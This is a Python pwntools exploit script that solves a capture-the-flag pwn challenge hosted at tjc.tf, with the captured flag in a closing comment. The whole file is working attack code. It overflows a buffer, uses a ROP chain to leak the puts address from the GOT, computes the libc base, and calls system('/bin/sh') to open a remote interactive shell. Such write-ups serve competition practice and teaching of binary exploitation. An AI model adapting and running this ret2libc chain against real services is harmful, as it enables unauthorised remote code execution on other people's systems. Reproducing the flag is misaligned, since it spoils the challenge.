from pwn import *

context.clear(arch="amd64")
elf = ELF("./chall")
#libc = ELF("/usr/lib/libc.so.6")
libc = ELF("libc6_2.31-0ubuntu9.7_amd64.so")
# https://libc.rip/
# puts = 450
# fgets = 660
rop = ROP(elf)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

log.success(f"{hex(pop_rdi)=}")
log.success(f"{hex(ret)=}")


offset = b"A" * 24
payload = b""
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["vacation"])

# p = process("./chall")
p = remote('tjc.tf',31705)

if len(offset + payload) % 16 != 0:
    payload = offset + p64(ret) + payload
    print("aligned")
else:
    payload = offset + payload

p.recvuntil(b"Where am I going today?\n")
p.send(payload)

recieved = p.recvline().strip()
print(f"{recieved=}")
leaked_puts = u64(recieved.ljust(8, b"\x00"))
log.info(f"Leaked libc address, puts: {hex(leaked_puts)}")

p.recvuntil(b"Where am I going today?\n")


libc.address = leaked_puts - libc.symbols["puts"]
log.success(f"{hex(libc.address)=}")
rop2 = ROP(elf)

log.success(f'{hex(libc.symbols["system"])=}')

sh_addr = next(libc.search(b"/bin/sh"))
log.success(f"{sh_addr=}")

rop2.call(libc.symbols["system"], [sh_addr])

offset = b"A" * 23
payload = offset + rop2.chain()

print(rop2.dump())
if len(offset + rop.chain()) % 16 != 0:
    payload = offset + p64(ret) + p64(ret) + rop2.chain()

p.sendline(payload)
p.interactive()

#tjctf{w3_g0_wher3_w3_w4nt_t0!_66f7020620e343ff}